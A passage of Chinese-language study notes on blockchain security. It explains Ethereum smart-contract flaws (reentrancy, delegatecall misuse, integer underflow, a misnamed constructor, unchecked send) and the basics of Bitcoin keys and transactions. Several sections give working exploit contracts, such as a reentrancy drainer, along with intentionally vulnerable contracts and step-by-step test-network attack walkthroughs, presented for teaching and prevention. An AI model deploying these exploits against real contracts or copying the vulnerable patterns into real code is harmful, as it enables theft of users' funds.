> **备注：**一个没有定义 fallback 函数的合约，直接接收以太币（没有函数调用，即，使用 `send` 或 `transfer` 发送以太币）会抛出一个异常， 并返还以太币（在 Solidity v0.4.0 之前行为会有所不同）。所以如果你想让你的合约接收以太币，必须实现 fallback 函数。 

#### 攻击合约

```javascript
pragma solidity ^0.4.10;

contract IDMoney {
    address owner;
    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况

    event withdrawLog(address, uint256);

    function IDMoney() { owner = msg.sender; }
    function deposit() payable { balances[msg.sender] += msg.value; }
    function withdraw(address to, uint256 amount) {
        require(balances[msg.sender] > amount);
        require(this.balance > amount);

        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy

        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
        balances[msg.sender] -= amount;
    }
    function balanceOf() returns (uint256) { return balances[msg.sender]; }
    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
}

contract Attack {
    address owner;
    address victim;

    event depositLog(uint256, uint256);

    modifier ownerOnly { require(owner == msg.sender); _; }

    function Attack() payable { owner = msg.sender; }

    // 设置已部署的 IDMoney 合约实例地址
    function setVictim(address target) ownerOnly { victim = target; }

    // deposit Ether to IDMoney deployed
    function step1(uint256 amount) ownerOnly payable {
        
        depositLog(this.balance, amount);
        
        if (this.balance > amount) {
            victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    // withdraw Ether from IDMoney deployed
    function step2(uint256 amount) ownerOnly {
        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
    }
    // selfdestruct, send all balance to owner
    function stopAttack() ownerOnly {
        selfdestruct(owner);
    }

    function startAttack(uint256 amount) ownerOnly {
        step1(amount);
        step2(amount / 2);
    }

    function () payable {
        if (msg.sender == victim) {
            // 再次尝试调用 IDMoney 的 withdraw 函数，递归转币
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
        }
    }
}
```

#### 攻击原理

> 著名导致以太坊硬分叉（ETH/ETC）的 `The DAO` 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。

**前提条件：**

1. `call.value()()` 提供了足够的  gas
2. 资产的修改在转币之后

![](pic/blockchain/reentrancy_attack.png) 

1. 攻击者部署 `Attack` 合约
2. `Attack` 合约调用 `IDMoney` 合约的 `deposit()` 存入接口
3. `Attack` 合约调用 `IDMoney` 合约的 `withdarw()` 取现接口，取现接口使用 `call.value()()` 触发 `fallback()`
4. 在 `fallback()` 接口中递归调用 `withdraw()`，从而不断从 `IDMoney` 合约提现以太坊

#### 攻击过程

在 `https://ethereum.github.io/browser-solidity` 或 `https://remix.ethereum.org` 编译合约

![](pic/blockchain/compile_idmoney.png)

使用外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733` 部署 `IDMoney` 合约

![](pic/blockchain/deploy_idmoney.png)

得到 `IDMoney` 合约地址 `0x692a70d2e424a56d2c6c27aa97d1a86395877b3a`

![](pic/blockchain/deploy_idmoney2.png)

向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 22 个以太坊，如下所示

![](pic/blockchain/deposit_idmoney.png)

点击 `deposit` 之后，查看交易信息

![](pic/blockchain/deposit_idmoney2.png)

通过 `balancaeof`() 查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 信息，合约中的余额为 22（0 --> 22），同时，账户余额为 77 （99 --> 77）

![](pic/blockchain/balanceof_idmoney.png)

查看交易信息

![](pic/blockchain/balanceof_idmoney2.png)



**WARNING: 切换到外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db ` 之后，才能部署合约 `Attack`**

部署 `Attack` 合约

![](pic/blockchain/deploy_attack.png)

部署合约之后，得到 `Attack` 合约地址 `0x8046085fb6806caa9b19a4cd7b3cd96374dd9573`，同时可以查看到外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db ` 余额变为 97 以太坊

![](pic/blockchain/deploy_attack2.png)

查看交易信息

![](pic/blockchain/deploy_attack3.png)

调用 `setVictim()` 设置合约 `IDMoney` 地址，如下所示

![](pic/blockchain/set_victim_attack.png)

查看交易信息

![](pic/blockchain/set_victim_attack2.png)

外部账户`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`  尝试发动攻击，调用 `Attack` 合约中的 `startAttack(1000000000000000000)`，即，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 先向钱包转入 1 个以太坊，然后提取 0.5 个以太坊

![](pic/blockchain/start_attack.png)

查看交易信息如下

> **备注：**交易信息部分截图如下，注意查看 `logs`，包含 46 条事件日志，第 1 条为 `Attack` 合约打印，剩下的 45 条为 `IDMoney` 合约打印。

![1533927494535](pic/blockchain/start_attack3.png)

调用 `stopAttack()` 停止攻击，销毁 `Attack` 合约，并将合约余额退回到外部账户`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 

![](pic/blockchain/stop_attack.png)

查看交易信息

![](pic/blockchain/stop_attack2.png)

此时，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`  的余额如下所示

> **计算思路：**`97.9 + 2 - 1 + 45 * 0.5 = 121.4`，其中，97.9 为部署 `Attack` 合约之后的余额， 2 为转到 `Attack` 合约中的以太坊数量（合约销毁即退回原账户），1 为存入 `IDMoney` 合约的以太坊数量， 45 * 0.5 为递归提现的以太坊数量。
>

> 另外，对于锁定在 `IDMoney` 中的 0.5 以太坊，可以通过在 `IDMoney` 预留销毁合约接口，即可实现销毁合约退回到原账户，大致如下：

```bash
// selfdestruct, send all balance to owner
function stopAttack() ownerOnly {
    selfdestruct(owner);
}
```

![](pic/blockchain/balanceof_idmoney3.png)

#### 攻击过程演示

![Alt Text](gif/blockchain/reentry.gif)

####  扩展

上述攻击合约中提现接口包含 `balances[msg.sender] -= amount;`，因为存在递归调用，存在数值溢出的问题。

如果在攻击合约中加入如下事件日志 `withdrawLog2()` 逻辑

```javascript
event withdrawLog(address, uint256);
event withdrawLog2(address, uint256, uint256);

function IDMoney() { owner = msg.sender; }
function deposit() payable { balances[msg.sender] += msg.value; }
function withdraw(address to, uint256 amount) {
    require(balances[msg.sender] > amount);
    require(this.balance > amount);

    withdrawLog(to, amount);

    to.call.value(amount)();
    balances[msg.sender] -= amount;

    withdrawLog2(msg.sender, amount, balances[msg.sender]);
}
```

在执行完攻击之后，可以在日志记录中查看到如下信息，从第 3 次开始，数值已经溢出，如下所示：

![](pic/blockchain/attack_log.png)

### 以太坊智能合约安全：访问控制

#### 函数可见性

由于 Solidity 有两种函数调用（内部调用不会产生实际的 EVM 调用或称为“消息调用”，而外部调用则会产生一个 EVM 调用）， 函数和状态变量有四种可见性类型。 函数可以指定为 `external`，`public` ，`internal` 或者 `private`，默认情况下函数类型为 `public`。 对于状态变量，不能设置为 `external` ，默认是 `internal` 。

- `external` 

  外部函数作为合约接口的一部分，意味着我们可以从其他合约和交易中调用。 一个外部函数 `f` 不能从内部调用（即 `f` 不起作用，但 `this.f()` 可以）。 当收到大量数据的时候，外部函数有时候会更有效率

- `public` 

  public 函数是合约接口的一部分，可以在内部或通过消息调用。对于公共状态变量， 会自动生成一个 getter 函数

- `internal` 

  这些函数和状态变量只能是内部访问（即从当前合约内部或从它派生的合约访问），不使用 `this` 调用

- `private` 

  private 函数和状态变量仅在当前定义它们的合约中使用，并且不能被派生合约使用

#### 函数底层调用方式

在 Solidity 中，`call` 函数簇可以实现跨合约的函数调用功能，其中包括 `call`、`delegatecall` 和 `callcode` 三种方式。

在 Solidity 中 `call` 函数簇的调用模型：

> 其中，`callcode` 不建议使用，后续将会被去掉

```javascript
<address>.call(...) returns (bool)
<address>.callcode(...) returns (bool)
<address>.delegatecall(...) returns (bool)
```

这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。

在函数调用的过程中， Solidity 中的内置变量 `msg` 会随着调用的发起而改变，`msg` 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。

**三种调用方式的异同点**

- `call` 最常用的调用方式，调用后内置变量 `msg` 的值**会修改**为调用者，执行环境为**被调用者**的运行环境
- `delegatecall` 调用后内置变量 `msg` 的值**不会修改**为调用者，但执行环境为**调用者**的运行环境
- `callcode` 调用后内置变量 `msg` 的值**会修改**为调用者，但执行环境为**调用者**的运行环境

`call` 与 `delegatecall` 的上下文环境对比如下所示

> 合约 A 以 `call` 方式调用外部合约 B 的 `func()` 函数，在外部合约 B 上下文执行完 `func()` 后继续返回 A 合约上下文继续执行；而当 A 以 `delegatecall` 方式调用时，相当于将外部合约 B 的 `func()` 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。

![](pic/blockchain/call_delegatecall.png)

#### 存在漏洞的合约

```javascript
contract A {
    address public owner;
    uint256 public value;
    
    constructor () public {
        owner = msg.sender;
        value = 99;
    }

    function infect(address _addr) public returns(bool) {
        return _addr.delegatecall(bytes4(keccak256("func()")));
    }
}
```

#### 存在的问题

合约 `A` 中，函数 `infect` 使用 `delegatecall` 调用另一合约的函数，如果攻击者部署一个精心构造的合约，并且将该地址传入函数 `infect`，能够将合约 `A` 中的 `owner` 修改为攻击者自己（`msg.sender`）

#### 攻击合约

```javascript
pragma solidity ^0.4.24;

contract A {
    address public owner;
    uint256 public value;
    
    constructor () public {
        owner = msg.sender;
        value = 99;
    }

    function infect(address _addr) public returns(bool) {
        return _addr.delegatecall(bytes4(keccak256("func()")));
    }
}

contract B {
    address public owner;
    uint256 public value;
    
    constructor () public {
        owner = msg.sender;
        value = 101;
    }

    function func() public  {
        owner = msg.sender;
        value = 100;
    }
}
```

#### 攻击原理

`delegatecall` 执行环境为调用合约的上下文，即，合约 `A` 中的函数 `infect` 调用了合约 `B` 的函数 `func`，因为执行上下文是合约 `A`，所以能够修改合约 `A` 中的 `owner` 和 `value`

#### 攻击过程

使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `A`，并查看 `owner` 和 `value` 的值

![](pic/blockchain/deploy_access_control.png)

使用账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 部署合约 `B`，并查看 `owner` 和 `value` 的值

![](pic/blockchain/deploy_access_control2.png)

执行合约 `A` 的函数 `infect`，参数为合约 `B` 的合约地址

![](pic/blockchain/call_infect.png)

然后，并查看合约 `A` 中 `owner` 和 `value` 的值

![](pic/blockchain/owner_value.png)

### 以太坊智能合约安全：算数问题

通常来说，在编程语言里算数问题导致的漏洞最多的就是整数溢出了，整数溢出又分为上溢和下溢。

#### 整数上溢

整数溢出的原理其实很简单，这里以 8 位无符整型为例，8 位整型可表示的范围为 `[0, 255]`，`255` 在内存中存储按位存储的形式如下：

![img](pic/blockchain/overflow.png)

8 位无符整数 255 在内存中占据了 8bit 位置，若再加上 1 整体会因为进位而导致整体翻转为 0，最后导致原有的 8bit 表示的整数变为 0.

如果是 8 位有符整型，其可表示的范围为 `[-128, 127]`，`127` 在内存中存储按位存储的形式如下所示：

![img](pic/blockchain/overflow2.png)

在这里因为高位作为了符号位，当 `127` 加上 1 时，由于进位符号位变为 `1`（负数），因为符号位已翻转为 `1`，通过还原此负数值，最终得到的 8 位有符整数为 `-128`。

上面两个都是整数上溢的图例，同样整数下溢 `(uint8)0-1=(uint8)255`, `(int8)(-128)-1=(int8)127`。

#### 存在问题的合约

```javascript
pragma solidity ^0.4.24;

contract Token {
    mapping (address => uint256) balances;
        
    function balanceOf(address _user) public view returns (uint256) { return balances[_user]; }
    function deposit() public payable { balances[msg.sender] += msg.value; }
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] - _amount > 0);  // 存在整数溢出
        msg.sender.transfer(_amount);
        balances[msg.sender] -= _amount;
    }
}
```

#### 存在的问题

合约中函数 `withdraw` 的判断条件为 `balances[msg.sender] - _amount > 0`，当某个账户余额小于 `_amount` 时，由于下溢导致条件始终为真，导致将不属于该账户的余额提取

#### 攻击过程

使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约，并存入 66 以太坊

![](pic/blockchain/deposit2.png)

切换到账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148`，查询合约中该账户余额为 0

![](pic/blockchain/balanceof.png)

然后执行合约函数 `withdraw`，尝试提取不属于自己的资产，如下所示

![](pic/blockchain/withdraw.png)

![](pic/blockchain/withdraw2.png)

此时，账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 余额变成了 122 以太坊（初始 100 以太坊 + 提取 22 以太坊）

![](pic/blockchain/balance.png)

### 以太坊智能合约安全：构造函数失控

#### 构造函数失控

构造函数（Constructors）是特殊函数，在初始化合约时经常执行关键的权限任务。在 Solidity v0.4.22 以前，构造函数被定义为与所在合约同名的函数。因此，存在如下安全隐患：

- 合约开发过程中修改合约名称，但构造函数没有对应修改，导致“你以为的构造函数”变成了普通的可调用函数

- 构造函数名称存在拼写错误，导致与合约名称不匹配，导致“你以为的构造函数”变成了普通的可调用函数

进一步地，如果构造函数存在权限相关的任务，将导致权限的泄露。

#### 示例合约

> 如下合约中，合约名称与“你以为的”构造函数名称不一致，加之，函数的默认可见性为 `public`，从而导致权限的泄露。

```javascript
pragma solidity ^0.4.24;

contract OwnerWallet {
    address public owner;

    // the constructor you expect to be, but not in fact
    function ownerWallet(address _owner) public {
        owner = _owner;
    }

    function () payable public {} 

    function withdraw() public {
        require(msg.sender == owner); 
        msg.sender.transfer(address(this).balance);
    }
}
```

该合约储存以太坊，并只允许所有者通过调用 `withdraw()` 函数来取出所有 Ether。但由于构造函数的名称与合约名称不完全一致，这个合约会出问题。具体来说， `ownerWallet` 与 `OwnerWallet` 不相同。

因此，任何用户都可以调用 `ownerWallet()` 函数，将自己设置为所有者，然后通过调用 `withdraw()` 将合约中的所有以太坊都取出来。

#### 预防措施

在 Solidity 0.4.22 版本的编译器中已经基本得到了解决。该版本引入了一个关键词 `constructor` 来指定构造函数，而不是要求函数的名称与合约名称匹配。建议使用这个关键词来指定构造函数，以防止上面显示的命名问题。 

#### 真实世界的例子：Rubixi

[Rubixi](https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code) 合约中的构造函数一开始叫做 `DynamicPyramid` ，但合约名称在部署之前已改为 `Rubixi` 。构造函数的名字没有改变，因此任何用户都可以成为 `creator` 。

### 以太坊智能合约安全：未初始化的存储指针

### 以太坊智能合约安全：从合约中提现

####  transfer 转账失败

> `Richest` 合约中，任何人支付高于前一个人所支付的以太坊，即，成为最富有的人

```javascript
pragma solidity ^0.4.24;

contract Richest {
    address public richest;
    uint public mostSent;

    constructor() public payable {
        richest = msg.sender;
        mostSent = msg.value;
    }

    function becomeRichest() public payable returns (bool) {
        if (msg.value > mostSent) {
            // 这一行会导致问题
            richest.transfer(msg.value);
            richest = msg.sender;
            mostSent = msg.value;
            return true;
        } else {
            return false;
        }
    }
}

contract Test {
    Richest public target_;

    constructor(address _target)  public payable {
        target_ = Richest(_target);
    }

    function test() public payable {
        target_.becomeRichest.value(msg.value)();
    }

    function () public payable {
        revert("oops");
    }
}
```

**存在的问题：**攻击者可以给这个合约设下陷阱，使其进入不可用状态，比如通过使一个 `fallback` 函数会失败的合约成为 `richest` （可以在 `fallback` 函数中调用 `revert()` 或者直接在 `fallback` 函数中使用超过 2300 gas 来使其执行失败）。这样，当这个合约调用 `transfer` 来给“下过毒”的合约发送资金时，调用会失败，从而导致 `becomeRichest` 函数失败，这个合约也就被永远卡住了。

详细的攻击过程如下：

- 使用账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 部署 `Richest` 合约，得到合约地址 `0xe46b2d8b3a5ccf2df628468dee2f3ec1e85e7a28`

![](pic\blockchain\deploy_richest.png)

- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署攻击合约 `Test`

![](pic\blockchain\deploy_test.png)

- 使用账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 调用 `Richest` 合约接口 `becomeRichest()` 并存入 2 以太坊，成为最富有的人

![](pic\blockchain\call_become_richest.png)

![](pic\blockchain\call_become_richest2.png)

- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 调用攻击合约 `Test` 接口 `test()`，并存入 3 以太坊

![](pic/blockchain/call_test.png)

- 此时查看最富有的人变成了攻击合约 `Test`，金额变为了 3 以太坊

![](pic/blockchain/call_become_richest3.png)

- 使用账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 调用 `Richest` 合约接口 `becomeRichest()` 并存入 10 以太坊，此时，由于触发攻击合约中的 `fallback` 函数，进而调用 `revert()`

![](pic/blockchain/call_fallback.png)

#### send 转账失败

> 合约 `Lotto` 中，假设通过 `setWinner` 设置中奖者地址，正常情况下，任何人可以帮助中奖者兑奖 `sendToWinner`，并且取出剩余的少数以太坊。

````javascript
pragma solidity ^0.4.24;

contract Lotto {

    bool public payedOut = false;
    address public winner;
    uint256 public winAmount;
    
    constructor() public payable {
        //
    }
    
    // 辅助函数，此处用来设置中奖者地址
    function setWinner(address _winner) public payable {
        winner = _winner;
        winAmount = msg.value;
    }

    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(address(this).balance);
    }
}

contract Test {
    Lotto public target_;

    constructor(address _target)  public payable {
        target_ = Lotto(_target);
    }

    function test() public payable {
        target_.sendToWinner();
    }
    
    function () public payable {
        revert();
    }
}
````

**存在的问题：**合约 `Lotto` 中，给中奖者兑奖时，未检查 `send` 转账函数的返回值，即使 `send` 失败，仍然会将是否已兑奖的标识 `payOut` 置位，继而窃取剩余的大量的原来属于中奖者的以太坊。

详细的攻击过程如下：

使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `Lotto`

![](pic/blockchain/deploy_lotto.png) 

- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `Test`

![](pic/blockchain/deploy_test2.png)

- 设置合约 `Test` 为中奖者，并存入 5 个以太坊

![](pic/blockchain/set_winner.png)

- 切换账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 给中奖者兑奖

![](pic/blockchain/send_to_winner.png)

此时兑奖失败，却标记为已兑奖

![](pic/blockchain/send_to_winner2.png)

- 使用账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 窃取剩余的大量的原来属于中奖者的以太坊

![](pic/blockchain/withdraw_left_over.png)

![](pic/blockchain/withdraw_left_over2.png)

此时，账户余额变为 105 以太坊。

#### 预防技术

- 尽量使用 `transfer()` 转账，而不是 `send()`，因为，如果外部交易回滚，`transfer()`会触发回滚
- 如果使用 `send()` 转账，请务必检查返回值

- 如果有可能，使用 `withdrawel` 模式，在这个解决方案中，每个用户都得调用相互隔离的取现函数。将外部发送功能与代码库的其余部分进行逻辑隔离，并将可能失败的交易负担交给正在调用取现函数的最终用户

```javascript
pragma solidity ^0.4.11;

contract WithdrawalContract {
    address public richest;
    uint public mostSent;

    mapping (address => uint) pendingWithdrawals;

    function WithdrawalContract() public payable {
        richest = msg.sender;
        mostSent = msg.value;
    }

    function becomeRichest() public payable returns (bool) {
        if (msg.value > mostSent) {
            pendingWithdrawals[richest] += msg.value;
            richest = msg.sender;
            mostSent = msg.value;
            return true;
        } else {
            return false;
        }
    }

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        // 记住，在发送资金之前将待发金额清零
        // 来防止重入（re-entrancy）攻击
        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}
```

## 比特币

![](pic/blockchain/bitcoin.png)

### 密钥和地址

一个比特币钱包中包含一系列的密钥对，每个密钥对包括一个私钥和一个公钥。私钥（k）是一个数字，通常是随机选出的。有了私钥，我们就可以使用椭圆曲线乘法这个单向加密函数产生一个公钥（K）。有了公钥（K），我们就可以使 用一个单向加密哈希函数生成比特币地址（A）。在本节中，我们将从生成私钥开始，讲述如何使用椭圆曲线运算将私 钥生成公钥，并最终由公钥生成比特币地址。

#### 钱包地址的生成

![img](pic/bitcoin/wallet_address.jpg)

1. 首先使用随机数发生器生成一个『私钥』。一般来说这是一个256 bits 的数，拥有了这串数字就可以对相应『钱包地址』中的比特币进行操作，所以必须被安全地保存起来。
2. 『私钥』经过 SECP256K1 算法处理生成了『公钥』。SECP256K1 是一种椭圆曲线算法，通过一个已知『私钥』时可以算得『公钥』，而『公钥』已知时却无法反向计算出『私钥』。这是保障比特币安全的算法基础
3. 同 SHA256 一样，RIPEMD160 也是一种 Hash 算法，由『公钥』可以计算得到『公钥哈希』，而反过来是行不通的。
4. 将一个字节的地址版本号连接到『公钥哈希』头部（对于比特币网络的 pubkey 地址，这一字节为“0”），然后对其进行两次 SHA256 运算，将结果的前 4 字节作为『公钥哈希』的校验值，连接在其尾部。
5. 将上一步结果使用 BASE58 进行编码（比特币定制版本），就得到了『钱包地址』。

> **如下详细展示一个钱包地址的生成步骤**
>

第一步，随机选取一个 32 字节的数、大小介于 1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141 之间，作为私钥
18E14A7B6A307F426A94F8114701E7C8E774E7F9A47E2C2035DB29A206321725
第二步，使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的**非压缩公钥**。 (共 65 字节， 1 字节 0x04, 32 字节为 x 坐标，32 字节为 y 坐标）

0450863AD64A87AE8A2FE83C1AF1A8403CB53F53E486D8511DAD8A04887E5B
23522CD470243453A299FA9E77237716103ABC11A1DF38855ED6F2EE187E9C582BA6
第三步，计算公钥的 SHA-256 哈希值
600FFE422B4E00731A59557A5CCA46CC183944191006324A447BDB2D98D4B408
第四步，取上一步结果，计算 RIPEMD-160 哈希值
010966776006953D5567439E5E39F86A0D273BEE
第五步，取上一步结果，前面加入地址版本号（比特币主网版本号“0x00”）
00010966776006953D5567439E5E39F86A0D273BEE
第六步，取上一步结果，计算 SHA-256 哈希值
445C7A8007A93D8733188288BB320A8FE2DEBD2AE1B47F0F50BC10BAE845C094
第七步，取上一步结果，再计算一下 SHA-256 哈希值
D61967F63C7DD183914A4AE452C9F6AD5D462CE3D277798075B107615C1A8A30 
第八步，取上一步结果的前 4 个字节（8 位十六进制）
D61967F6
第九步，把这 4 个字节加在第五步的结果后面，作为校验（这就是比特币钱包地址的十六进制形态）
00010966776006953D5567439E5E39F86A0D273BEED61967F6 
第十步，用 base58 表示法变换一下地址（这就是最常见的比特币钱包地址形态）
1M8DPUBQXsVUNnNiXw5oFdRciguXctWpUD

#### 私钥、公钥、钱包地址

![img](pic/bitcoin/private_public_address.jpg)

通过『私钥』可以得到上述计算过程中所有的值。 『公钥哈希』和『钱包地址』可以通过互逆运算进行转换，所以它们是等价的。

#### 使用『私钥』对交易进行签名

![img](pic/bitcoin/transaction.jpg)

比特币钱包间的转账是通过交易（Transaction）实现的。交易数据是由转出钱包『私钥』的所有者生成，也就是说有了『私钥』就可以花费该钱包的比特币余额。生成交易的过程如下：

1. 交易的原始数据包括“转账数额”和“转入钱包地址”，但是仅有这些是不够的，因为无法证明交易的生成者对“转出钱包地址”余额有动用的权利。所以需要用『私钥』对原始数据进行签名。
2. 生成“转出钱包公钥”，这一过程与生成『钱包地址』的第 2 步是一样的。
3. 将“转出签名”和“转出公钥”添加到原始交易数据中，生成了正式的交易数据，这样它就可以被广播到比特币网络进行转账了。

#### 使用『公钥』对签名进行验证

![img](pic/bitcoin/verify.jpg)

交易数据被广播到比特币网络后，节点会对这个交易数据进行检验，其中就包括对签名的校验。如果校验正确，那么这笔余额就成功地从“转出钱包”转移到“转入钱包”了。

#### 结论

> 本文仅讨论标准 P2PKH（对公钥哈希的付款 ） 交易方式，P2SH 不在讨论范围内。

如果一个『钱包地址』从未曾发送余额到其他『钱包地址』，那么它的『公钥』是不会暴露在比特币网络上的。而公钥生成算法（SECP256K1）是不可逆的，即使『公钥』暴露，也很难对『私钥』的安全性造成影响（难易取决于『私钥』的生成算法）。

『私钥』用来生成『公钥』和『钱包地址』，也用来对交易进行签名。拥有了『私钥』就是拥有了对这个钱包余额的一切操作权力。

所以，保护『私钥』是所有比特币钱包应用最基本也是最重要的功能。

### 钱包

“钱包”一词在比特币中有多重含义。 广义上，钱包是一个应用程序，为用户提供交互界面。 钱包控制用户访问权限，管理密钥和地址，跟踪余额以及创建和签名交易。 狭义上，即从程序员的角度来看，“钱包”是指用于存储和管理用户密钥的数据结构。

#### 非确定性钱包

**非确定性钱包（nondeterministic wallet）**，其中每个密钥都是从随机数独立生成的。密钥彼此无关。这种钱包也被称为“Just a Bunch Of Keys（一堆密钥）”，简称 JBOK 钱包

#### 确定性钱包

**确定性钱包（deterministic wallet）**，其中所有的密钥都是从一个主密钥派生出来，这个主密钥即为种子（seed）。该类型钱包中所有密钥都相互关联，如果有原始种子，则可以再次生成全部密钥。确定性钱包中使用了许多不同的密钥推导方法。最常用的推导方法是使用树状结构，称为分级确定性钱包或 HD 钱包。

### 交易

> 比特币交易是比特币系统中最重要的部分。根据比特币系统的设计原理，系统中任何其他的部分都是为了确保比特币交易可以被生成、能在比特币网络中得以传播和通过验证，并最终添加入全球比特币交易总账簿（比特币区块链）。比特币交易的本质是数据结构，这些数据结构中含有比特币交易参与者价值转移的相关信息。比特币区块链是一本全球复式记账总账簿，每个比特币交易都是在比特币区块链上的一个公开记录。
>

> 五大标准脚本分别为 P2PKH、P2PK、MS（限15个密钥）、P2SH 和 OP_RETURN

通过 Bitcoin Core 解码的一笔标准的交易信息如下：

```json
{
  "version": 1,
  "locktime": 0,
  "vin": [
    {
      "txid":"7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18",
      "vout": 0,
      "scriptSig": "3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d172787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf",
      "sequence": 4294967295
    }
 ],
  "vout": [
    {
      "value": 0.01500000,
      "scriptPubKey": "OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG"
    },
    {
      "value": 0.08450000,
      "scriptPubKey": "OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG",
    }
  ]
}
```

#### 交易的输入输出

比特币交易中的基础构建单元是交易输出。 交易输出是比特币不可分割的基本组合，记录在区块上，并被整个网络识别为有效。 比特币完整节点跟踪所有可找到的和可使用的输出，称为 “未花费的交易输出”（unspent transaction outputs），即 UTXO。 所有 UTXO 的集合被称为 UTXO 集，目前有数百万个 UTXO。 当新的 UTXO被创建，UTXO 集就会变大，当 UTXO 被消耗时，UTXO 集会随着缩小。每一个交易都代表 UTXO 集的变化（状态转换） 。

一笔交易会消耗先前的已被记录（存在）的 UTXO，并创建新的 UTXO 以备未来的交易消耗。通过这种方式，一定数量的比特币价值在不同所有者之间转移，并在交易链中消耗和创建 UTXO。一笔比特币交易通过使用所有者的签名来解锁 UTXO，并通过使用新的所有者的比特币地址来锁定并创建 UTXO。

从交易的输出与输入链角度来看，有一个例外，即存在一种被称为“创币交易”（Coinbase Transaction）的特殊交易，它是每个区块中的第一笔交易，这种交易存在的原因是作为对挖矿的奖励，创造出全新的可花费比特币用来支付给“赢家”矿工。

#### 交易输出

每一笔比特币交易都会创造输出，并被比特币账簿记录下来。除特例之外（见“数据输出操作符”（OP_RETURN）），几乎所有的输出都能创造一定数量的可用于支付的比特币，也就是 UTXO。这些 UTXO 被整个网络识别，所有者可在未来的交易中使用它们。

UTXO 在 UTXO 集（UTXOset）中被每一个全节点比特币客户端追踪。 新的交易从UTXO 集中消耗（花费）一个或多个输出。

| 尺寸                   | 字段         | 说明                                |
| ---------------------- | ------------ | ----------------------------------- |
| 8 个字节               | 总量         | 用聪表示的比特币值（10^-8^ 比特币） |
| 1–9 个字节（可变整数） | 锁定脚本尺寸 | 用字节表示的后面的锁定脚本长度      |
| 变长                   | 锁定脚本     | 一个定义了支付输出所需条件的脚本    |

- 一定量的比特币，面值为“聪”（satoshis），是最小的比特币单位

- 确定花费输出所需条件的加密难题（cryptographic puzzle）。这个加密难题也被称为锁定脚本（locking script）, 见证脚本（witness script）, 或脚本公钥 （scriptPubKey）

#### 交易输入

交易输入将 UTXO（通过引用）标记为将被消费，并通过解锁脚本提供所有权证明。

要构建一个交易，一个钱包从它控制的 UTXO 中选择足够的价值来执行被请求的付款。有时一个 UTXO 就足够，其他时候不止一个。对于将用于进行此付款的每个 UTXO，钱包将创建一个指向 UTXO 的输入，并使用解锁脚本解锁它。

| 尺寸                    | 字段         | 说明                                        |
| ----------------------- | ------------ | ------------------------------------------- |
| 32 个字节               | 交易         | 指向交易包含的被花费的 UTXO 的哈希指针      |
| 4 个字节                | 输出索引     | 被花费的 UTXO 的索引号，第一个是 0          |
| 1–9  个字节（可变整数） | 解锁脚本尺寸 | 用字节表示的后面的解锁脚本长度              |
| 变长                    | 解锁脚本     | 一个达到 UTXO 锁定脚本中的条件的脚本        |
| 4 个字节                | 序列号       | 目前未被使用的交易替换功能，设成 0xFFFFFFFF |

- 一个交易 ID，引用包含正在使用的 UTXO 的交易
- 一个输出索引（vout），用于标识来自该交易的哪个 UTXO 被引用（第一个为零）
- 一个 scriptSig（解锁脚本），满足放置在 UTXO 上的条件，解锁它用于支出
- 一个序列号

